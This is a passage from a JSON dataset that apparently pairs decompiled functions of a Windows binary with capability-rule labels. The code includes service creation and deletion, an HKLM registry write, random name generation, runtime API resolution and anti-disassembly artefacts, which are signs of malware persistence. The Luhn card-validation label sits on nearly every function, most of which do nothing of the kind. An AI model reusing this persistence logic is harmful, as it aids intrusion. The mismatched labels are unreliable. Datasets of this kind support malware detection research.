    puVar7 = puVar7 + -*(puVar7 + 0x5f9dff63);\n        if (-1 < puVar7) {\n            if (-1 < param_3) {\n                fcn.004021f0(puVar7 + -0x68, *(puVar7 + -4), 0x411728, 0x11000);\n                puVar2 = *(puVar7 + 0xc);\n                **(puVar7 + 8) = 0x411728;\n                *puVar2 = 0x11000;\n                return;\n            }\n            goto code_r0x00404d8b;\n        }\n        uStackY24 = iVar1 + 1;\n        in_EAX = in_EAX & 0xff00 | in_EAX + 0xa8;\n        unaff_ESI = unaff_EDI;\n    } while( true );\n}\n",
        "token_count": 1238
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = fcn.00404910(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 69
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401500(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "004016d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017bd) overlaps instruction at (ram,0x004017bb)\n// \n\nint32_t fcn.004016d0(uint param_1)\n\n{\n    uchar uVar1;\n    code **ppcVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint unaff_EBX;\n    int32_t *piVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    uint *in_FS_OFFSET;\n    bool bVar15;\n    bool bVar16;\n    bool bVar17;\n    ulong uVar18;\n    unkbyte6 Var19;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puVar12 = &stack0xfffffffc;\n    uStack8 = 0xffffffff;\n    uStack12 = 0x405010;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    puVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x40740c);\n    bVar15 = false;\n    bVar17 = false;\n    bVar16 = puVar4 == NULL;\n    if (bVar16) {\n        *in_FS_OFFSET = uStack16;\n        return 1;\n    }\n    Var19 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407418);\n    pcVar5 = Var19;\n    puVar11 = &stack0xfffffffc;\n    puVar14 = puVar4;\n    if ((!bVar17) && (puVar11 = &stack0xfffffffc,  bVar17)) {\n        puVar14 = puVar4 + 1;\n        uVar1 = in(Var19 >> 0x20);\n        *puVar4 = uVar1;\n        piVar10 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (!bVar15 && !bVar16) goto code_r0x004017aa;\n        uVar18 = func_0x04287fad(0x56);\n        param_1 = uVar18 >> 0x20;\n        pcVar5 = uVar18;\n        *pcVar5 = *pcVar5 + uVar18;\n        puVar11 = &uStack8 + 3;\n    }\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(param_1, pcVar5, 0, 0, 2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar14, 0x40742c);\n    piVar10 = NULL;\n    puVar12 = puVar11;\n    if (pcVar5 == NULL) {\n        *in_FS_OFFSET = *(puVar11 + -0xc);\n        return 1;\n    }\ncode_r0x004017aa:\n    *(puVar12 + -0x20) = piVar10;\n    *(puVar12 + -4) = piVar10;\n    iVar6 = (*pcVar5)(*(puVar12 + -0x18), str._D_3, piVar10, puVar12 + -0x20);\n    piVar8 = *(puVar12 + -0x20);\n    if ((iVar6 < piVar10) || (piVar8 == piVar10)) {\n        *(puVar12 + -4) = 0xffffffff;\n        if (piVar8 != piVar10) {\n            (**(*piVar8 + 8))(piVar8);\n        }\n    }\n    else {\n        *(puVar12 + -0x24) = piVar10;\n        iVar6 = *piVar8;\n        puVar12[-4] = 1;\n        iVar6 = (**(iVar6 + 0x20))(piVar8, puVar12 + -0x24);\n        piVar8 = *(puVar12 + -0x24);\n        if ((iVar6 < piVar10) || (piVar8 == piVar10)) {\n            puVar12[-4] = piVar10;\n            if (piVar8 != piVar10) {\n                (**(*piVar8 + 8))(piVar8);\n            }\n            piVar8 = *(puVar12 + -0x20);\n            *(puVar12 + -4) = 0xffffffff;\n            if (piVar8 != piVar10) {\n                (**(*piVar8 + 8))(piVar8);\n            }\n        }\n        else {\n            *(puVar12 + -0x1c) = piVar10;\n            (**(*piVar8 + 0x24))(piVar8, puVar12 + -0x1c);\n            *(puVar12 + -0x40) = piVar10;\n            if (piVar10 < *(puVar12 + -0x1c)) {\n                do {\n                    iVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n                    iVar7 = iVar7 % *(puVar12 + -0x1c);\n                    *(puVar12 + -0x34) = 3;\n                    *(puVar12 + -0x2c) = iVar7;\n                    *(puVar12 + 8) = piVar10;\n                    *(puVar12 + -0x10) = piVar10;\n                    iVar6 = **(puVar12 + -0x24);\n                    puVar12[-4] = 4;\n                    iVar6 = (**(iVar6 + 0x2c))(*(puVar12 + -0x24), *(puVar12 + -0x34), *(puVar12 + -0x30), iVar7, \n                                               *(puVar12 + -0x28), *(puVar12 + -0x34), *(puVar12 + -0x30), iVar7, \n                                               *(puVar12 + -0x28), puVar12 + 8);\n                    piVar8 = *(puVar12 + 8);\n                    piVar10 = NULL;\n                    if ((iVar6 < 0) || (piVar8 == NULL)) {\n                        piVar3 = *(puVar12 + -0x10);\n                        puVar12[-4] = 3;\n                        if (piVar3 != NULL) {\n                            (**(*piVar3 + 8))(piVar3);\n                            piVar8 = *(puVar12 + 8);\n                        }\n                        puVar12[-4] = 2;\njoined_r0x00401b0e:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\ncode_r0x00401b1a:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar12 + -0x34);\n                        break;\n                    }\n                    iVar6 = (***piVar8)(piVar8, 0x4061b0, puVar12 + -0x10);\n                    piVar8 = *(puVar12 + -0x10);\n                    if ((iVar6 < 0) || (piVar8 == NULL)) {\n                        puVar12[-4] = 3;\njoined_r0x00401ad5:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                        piVar8 = *(puVar12 + 8);\n                        puVar12[-4] = 2;\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                        goto code_r0x00401b1a;\n                    }\n                    iVar6 = (**(*piVar8 + 0x38))(piVar8, puVar12 + -0x38);\n                    if (iVar6 < 0) {\ncode_r0x00401a96:\n                        piVar8 = *(puVar12 + -0x10);\n                        puVar12[-4] = 3;\n                        goto joined_r0x00401ad5;\n                    }\n                    if (*(puVar12 + -0x38) == 0) {\n                        piVar8 = *(puVar12 + -0x10);\n                        puVar12[-4] = 3;\njoined_r0x00401911:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                        piVar8 = *(puVar12 + 8);\n                        puVar12[-4] = 2;\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                    }\n                    else {\n                        fcn.00401500(*(puVar12 + -0x38), puVar12 + -0x24c, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(puVar12 + -0x38));\n                        iVar7 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar12 + -0x24c, 0x407440);\n                        if (iVar7 != 0) {\n                            piVar8 = *(puVar12 + -0x10);\n                            puVar12[-4] = 3;\n                            goto joined_r0x00401911;\n                        }\n                        *(puVar12 + -0x14) = 0;\n                        ppcVar2 = **(puVar12 + 8);\n                        puVar12[-4] = 5;\n                        iVar6 = (**ppcVar2)(*(puVar12 + 8), 0x4061a0, puVar12 + -0x14);\n                        piVar8 = *(puVar12 + -0x14);\n                        if ((iVar6 < 0) || (piVar8 == NULL)) {\n                            puVar12[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar12 + -0x10);\n                            puVar12[-4] = 3;\njoined_r0x00401aba:\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar12 + 8);\n                            puVar12[-4] = 2;\n                            goto joined_r0x00401b0e;\n                        }\n                        iVar6 = (**(*piVar8 + 0x20))(piVar8, puVar12 + -0x3c);\n                        if (iVar6 < 0) {\n                            piVar8 = *(puVar12 + -0x14);\n                            puVar12[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar12 + -0x10);\n                            puVar12[-4] = 3;\n                            goto joined_r0x00401aba;\n                        }\n                        iVar7 = *(puVar12 + -0x3c);\n                        if (iVar7 == 0) {\n                            piVar8 = *(puVar12 + -0x14);\n                            puVar12[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar12 + -0x10);\n                            puVar12[-4] = 3;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar12 + 8);\n                            puVar12[-4] = 2;\n                        }\n                        else {\n                            puVar12[-0x148] = 0;\n                            puVar13 = puVar12 + -0x147;\n                            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                                *puVar13 = 0;\n                                puVar13 = puVar13 + 1;\n                            }\n                            *puVar13 = 0;\n                            *(puVar13 + 2) = 0;\n                            fcn.00401500(iVar7, puVar12 + -0x148, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(puVar12 + -0x3c));\n                            iVar7 = fcn.00401620(puVar12 + -0x148);\n                            if (iVar7 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(**(puVar12 + -0x10) + 0x114))(*(puVar12 + -0x10));\n                                piVar8 = *(puVar12 + -0x14);\n                                puVar12[-4] = 4;\n                                if (piVar8 != NULL) {\n                                    (**(*piVar8 + 8))(piVar8);\n                                }\n                                goto code_r0x00401a96;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            piVar8 = *(puVar12 + -0x14);\n                            puVar12[-4] = 4;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar12 + -0x10);\n                            puVar12[-4] = 3;\n                            if (piVar8 != NULL) {\n                                (**(*piVar8 + 8))(piVar8);\n                            }\n                            piVar8 = *(puVar12 + 8);\n                            puVar12[-4] = 2;\n                        }\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar12 + -0x34);\n                    iVar7 = *(puVar12 + -0x40);\n                    *(puVar12 + -0x40) = iVar7 + 1;\n                } while (iVar7 + 1 < *(puVar12 + -0x1c));\n            }\n            piVar8 = *(puVar12 + -0x24);\n            puVar12[-4] = piVar10;\n            if (piVar8 != piVar10) {\n                (**(*piVar8 + 8))(piVar8);\n            }\n            piVar8 = *(puVar12 + -0x20);\n            *(puVar12 + -4) = 0xffffffff;\n            if (piVar8 != piVar10) {\n                (**(*piVar8 + 8))(piVar8);\n            }\n            puVar14 = *(puVar12 + -0x44);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(puVar14);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = *(puVar12 + -0xc);\n    return iVar6;\n}\n",
        "token_count": 3311
    },
    "00401f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401f50(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 158
    },
    "00402270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00402270(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                iVar1 = arg_14h + -1;\n                bVar5 = true;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    if (iVar1 == 0) break;\n                    iVar1 = iVar1 + -1;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 309
    },
    "00402310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402382) overlaps instruction at (ram,0x00402379)\n// \n\nuint __cdecl fcn.00402310(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool in_CF;\n    bool in_ZF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        *(iVar1 + 0x43d1773a) = *(iVar1 + 0x43d1773a) ^ 0x5627e95e;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 244
    },
    "00402500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040253c) overlaps instruction at (ram,0x00402538)\n// \n\nuint __cdecl fcn.00402500(uint *arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    unkbyte10 extraout_ST0;\n    ulong uVar5;\n    uint *puVar6;\n    \n    uVar2 = arg_ch;\n    puVar1 = arg_8h;\n    puVar6 = &arg_ch;\n    uVar5 = fcn.00403570(arg_8h, arg_ch, &arg_8h, puVar6);\n    piVar4 = uVar5 >> 0x20;\n    iVar3 = uVar5;\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if ((iVar3 < 0) || (iVar3 >= 0)) {\n        *(iVar3 + 0x58) = arg_ch;\n    }\n    else {\n        *(iVar3 + -0x7ce92414) = extraout_ST0;\n        *piVar4 = *piVar4 + 0x558bdf84;\n        puVar6 = puVar1;\n    }\n    fcn.00403570(puVar1, uVar2, &arg_8h, &arg_ch, puVar6);\n    return 1;\n}\n",
        "token_count": 320
    },
    "0040252d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040253c) overlaps instruction at (ram,0x00402538)\n// \n\nuint __cdecl fcn.0040252d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *in_EDX;\n    int32_t unaff_EBP;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    \n    if (in_OF == in_SF) {\n        *(in_EAX + 0x58) = *(unaff_EBP + 0xc);\n    }\n    else {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        *in_EDX = *in_EDX + 0x558bdf84;\n    }\n    fcn.00403570();\n    return 1;\n}\n",
        "token_count": 187
    },
    "00402900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402900(void)\n\n{\n    uint uVar1;\n    \n    if (*0x422738 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x422738 = 1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00402950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004029aa) overlaps instruction at (ram,0x004029a7)\n// \n\nbool fcn.00402950(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00404440(0x80000002, 0x407304, 0x407344, &var_8h, &var_10ch, &var_4h);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return false;\n    }\n    if ((!bVar2) && (bVar2)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 228
    },
    "004029d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a18) overlaps instruction at (ram,0x00402a16)\n// \n\nuint __cdecl fcn.004029d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint8_t in_CL;\n    uint extraout_ECX;\n    uint8_t in_DL;\n    uint8_t uVar2;\n    bool bVar3;\n    uint var_4h;\n    \n    uVar2 = in_CL < in_DL;\n    bVar3 = in_CL - 1 < '\\0';\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((bVar3) || (uVar1 = extraout_ECX,  !bVar3)) {\n        uVar1 = arg_8h;\n    }\n    fcn.00402310(arg_8h_00 + 0x84d8b2f + uVar2, uVar1);\n    uVar1 = fcn.00402a60(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 294
    },
    "00402a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a18) overlaps instruction at (ram,0x00402a16)\n// \n\nuint __cdecl fcn.00402a60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint extraout_ECX;\n    int32_t in_ECX;\n    char *in_EDX;\n    uchar *unaff_EDI;\n    uint8_t uVar3;\n    bool in_ZF;\n    bool bVar4;\n    char in_SF;\n    char in_OF;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *unaff_EDI = *unaff_EDI;\n        uVar3 = 0;\n        *in_EDX = *in_EDX;\n        bVar4 = *in_EDX < '\\0';\n        iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n        if ((bVar4) || (uVar2 = extraout_ECX,  !bVar4)) {\n            uVar2 = arg_8h;\n        }\n        fcn.00402310(iVar1 + 0x84d8b2f + uVar3, uVar2);\n        uVar2 = fcn.00402a60(iVar1, arg_8h, arg_ch);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return uVar2;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 474
    },
    "00402c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c73) overlaps instruction at (ram,0x00402c71)\n// \n\nuint __cdecl fcn.00402c20(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    int32_t unaff_EBX;\n    char cVar2;\n    char cVar3;\n    ushort uStack20;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    cVar3 = SBORROW4(extraout_ECX, 0x5354);\n    cVar2 = extraout_ECX + -0x5354 < 0;\n    uStack20 = iVar1;\n    (*_sym.imp.MSVCRT.dll_fwrite)();\n    if (cVar3 == cVar2) {\n        if (cVar3 != cVar2) {\n            *(unaff_EBX + 0x665314c4) = *(unaff_EBX + 0x665314c4) + extraout_DL + '\\x01';\n            goto code_r0x00402c80;\n        }\n    }\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\ncode_r0x00402c80:\n    (*_sym.imp.MSVCRT.dll_fclose)(uStack20);\n    return 1;\n}\n",
        "token_count": 324
    },
    "004032a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004032f6)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.004032a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pvData;\n    \n    pvData = NULL;\n    iVar2 = fcn.004044e0(&pvData);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (pvData == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = pvData;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071ec, 0x40722c, 1, pvData, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 267
    },
    "004034f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040350f)\n// WARNING: Removing unreachable block (ram,0x00403516)\n\nvoid __cdecl fcn.004034f0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403390(&var_68h, &var_4h);\n    fcn.004021f0(&var_68h, var_4h, 0x4074a4, 0xa280);\n    *arg_8h = 0x4074a4;\n    *arg_ch = 0xa280;\n    return;\n}\n",
        "token_count": 272
    },
    "00404440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040448e) overlaps instruction at (ram,0x0040448c)\n// \n// WARNING: Removing unreachable block (ram,0x004044b6)\n// WARNING: Removing unreachable block (ram,0x004044c0)\n\nint32_t __thiscall fcn.00404440(int32_t param_1, uint param_2, int32_t param_3, uint param_4, uint param_5)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    int32_t iVar6;\n    char *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    ulong uVar7;\n    int32_t iStack8;\n    \n    iStack8 = param_1;\n    iVar6 = 1;\n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        in_EAX = &iStack8;\n        param_1 = param_3;\n    }\n    *unaff_EDI = *unaff_EDI + param_1;\n    *in_EAX = *in_EAX + (param_1 >> 8);\n    uVar7 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(in_EAX, param_1, &stack0xfffffffc);\n    iVar4 = uVar7;\n    if (iVar4 != 0) {\n        return 0;\n    }\n    iVar5 = iStack8;\n    if ((-1 < iVar4) && (-1 >= iVar4)) {\n        param_4 = 0x76;\n        puVar1 = unaff_EBX + -0x74afebab;\n        uVar2 = *puVar1;\n        cVar3 = *puVar1 - extraout_ECX;\n        *puVar1 = cVar3 - 1;\n        *(extraout_ECX + -0x75) = *(extraout_ECX + -0x75) + (uVar7 >> 0x20) + (uVar2 < extraout_ECX || cVar3 == '\\0');\n        iVar5 = extraout_ECX;\n        param_5 = uVar7 >> 0x20;\n        iVar6 = iVar4;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(iVar5, param_4, 0, param_5);\n    if (iVar4 != 0) {\n        iVar6 = 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iStack8);\n    return iVar6;\n}\n",
        "token_count": 610
    },
    "00404b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404be5) overlaps instruction at (ram,0x00404be4)\n// \n\nuint fcn.00404b70(void)\n\n{\n    code cVar1;\n    uchar uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char extraout_CH;\n    uchar *extraout_ECX;\n    uint32_t unaff_EBX;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    unkbyte6 Var9;\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407118);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar4 == 0) {\n        return 0;\n    }\n    *0x422764 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, 0x407128);\n    bVar6 = false;\n    bVar8 = false;\n    bVar7 = extraout_CH == unaff_EBX;\n    Var9 = (*pcVar3)(iVar4, 0x407144);\n    *0x422768 = Var9;\n    if (!bVar8) {\n        if (bVar8) {\n            cVar1 = in(Var9 >> 0x20);\n            *pcVar3 = cVar1;\n            if (!bVar6 && !bVar7) {\n                uVar5 = (*_sym.imp.USER32.dll_RegisterClassExA)();\n                return uVar5;\n            }\n            uVar2 = *extraout_ECX;\n            *(iVar4 + -1) = *(iVar4 + -1) + (Var9 >> 0x20);\n            *0x42276c = CONCAT31(0x407154, *((unaff_EBX & 0xffff0000 | CONCAT11(uVar2, 0xbc)) + 0x68));\n            goto code_r0x00404bed;\n        }\n    }\n    *0x42276c = (*pcVar3)(iVar4, 0x407154);\ncode_r0x00404bed:\n    if (((*0x422764 != 0) && (*0x422768 != 0)) && (*0x42276c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 510
    },
    "00404da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
